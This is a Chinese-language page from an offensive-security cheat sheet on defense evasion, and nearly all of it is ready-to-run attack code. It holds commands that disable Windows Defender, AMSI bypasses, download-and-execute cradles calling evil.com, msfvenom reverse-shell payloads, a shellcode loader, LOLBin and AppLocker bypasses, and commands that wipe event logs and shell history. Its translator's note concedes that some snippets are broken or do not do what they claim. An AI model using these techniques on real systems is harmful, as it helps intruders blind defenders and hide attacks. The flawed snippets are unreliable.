# 🛡️ 阶段 6：防御规避（Defense Evasion）

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./06-Defense-Evasion.tr.md) • [🇬🇷 Ελληνικά](./06-Defense-Evasion.el.md)

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**目标：** 绕过杀毒软件（AV）、终端检测与响应（EDR）、反恶意软件扫描接口（AMSI）及防火墙等安全控制，避免被检测。

> **译注（版本与完整性）：** 这些示例不能保证绕过现代防护。启用 Tamper Protection（篡改防护）时，即使看似成功的 Defender 设置更改也可能被阻止，参见 [Microsoft 官方说明](https://learn.microsoft.com/en-us/defender-endpoint/tamper-protection-overview)。原文混淆 AMSI 示例的格式字符串含异常内容；ETW 示例仅声明 `EtwEventWrite` 并载入类型，没有实际修改其内存。C 加载器也省略了头文件并使用了截断的 Shellcode。这里保留原文代码并明确这些限制。

---

## 🛡️ Windows Defender 规避

### 禁用 Windows Defender（需要管理员权限）
```powershell
# 禁用实时监控
Set-MpPreference -DisableRealtimeMonitoring $true

# 禁用原文列出的 Defender 功能
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# 添加排除路径
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# 通过注册表
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### 检查 Defender 状态
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

## 🔓 AMSI 绕过

### PowerShell AMSI 绕过
```powershell
# 绕过 1：amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 绕过 2：Matt Graeber 的单行代码
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# 绕过 3：内存修补
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### 经过混淆的 AMSI 绕过
```powershell
# 字符串混淆
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 📦 载荷混淆

### PowerShell 混淆
```powershell
# Base64 编码
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# 字符串拼接
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### 二进制混淆
```bash
# msfvenom 编码
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# 自定义 XOR
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Shellcode（机器码载荷）加载器
```c
// 使用 C 编写的简单 Shellcode 加载器
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

## 🎭 借助系统自带程序执行（Living Off The Land / LOLBins）

### 下载与执行
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### 执行载荷
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### AppLocker/WDAC 绕过
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## 🔒 ETW（Windows 事件跟踪）与日志绕过

### 禁用事件跟踪
```powershell
# 修补 ETW
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### 清除事件日志
```powershell
# 清除所有日志
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# 或禁用日志记录
auditpol /clear /y
```

### 禁用 PowerShell 日志
```powershell
# 禁用脚本块日志
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# 禁用模块日志
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

## 🐧 Linux 规避

### 时间戳篡改（Timestomping）
```bash
# 修改文件时间戳
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### 清除日志
```bash
# 清除 bash 历史记录
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# 清除系统日志
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### 进程隐藏
```bash
# 隐藏进程名称
exec -a "[kworker/0:0]" ./malicious

# 使用 LD_PRELOAD 隐藏
# 编译挂钩 readdir() 的库以隐藏进程
```

---

## 🛠️ 工具

| 工具 | 用途 |
|------|---------|
| **Invoke-Obfuscation** | PowerShell 混淆 |
| **Veil** | 载荷生成 |
| **ScareCrow** | EDR 绕过载荷生成器 |
| **Donut** | Shellcode 生成器 |
| **Nimcrypt2** | PE 文件加壳工具 |
| **PEzor** | PE Shellcode 加载器 |

---

## 📊 快速参考

### 检测方式与绕过技术

| 检测方式 | 绕过技术 |
|-----------|------------------|
| 基于特征的检测 | 混淆、编码 |
| AMSI | 内存修补、绕过脚本 |
| ETW | ETW 修补 |
| 日志记录 | 禁用日志、清除日志 |
| AppLocker | LOLBins、绕过路径 |
| 行为检测 | 利用系统自带工具 |

### LOLBins 快速列表

| 二进制程序 | 用途 |
|--------|-----|
| certutil | 下载文件 |
| bitsadmin | 下载文件 |
| mshta | 执行 HTA |
| rundll32 | 执行 DLL/JS |
| regsvr32 | 执行 SCT |
| msbuild | 执行 XML |
| installutil | 执行 EXE |

---

## 🔗 相关速查表

- [PowerShell](../../PowerShell/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**上一阶段：** [← 05 - 持久化](./05-Persistence.zh-CN.md)

**下一阶段：** [07 - 达成攻击目标 →](./07-Actions-Objectives.zh-CN.md)
